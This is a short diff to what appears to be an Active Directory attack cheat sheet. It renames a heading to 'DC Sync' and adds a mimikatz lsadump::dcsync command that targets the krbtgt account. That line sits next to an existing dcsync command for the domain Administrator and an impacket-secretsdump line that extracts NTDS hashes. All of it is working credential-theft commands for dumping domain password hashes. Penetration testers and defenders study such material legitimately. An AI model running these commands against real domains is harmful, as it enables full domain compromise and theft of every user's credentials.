@@ -193,9 +193,12 @@ impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
 
 ---
 
-## Domain Controller Synchronization
+## Domain Controller Synchronization(DC Sync)
 ```powershell
 .\mimikatz.exe
+
+# attack test
+lsadump::dcsync /domain:contoso.com /user:krbtgt
 
 lsadump::dcsync /user:corp\Administrator
 ```
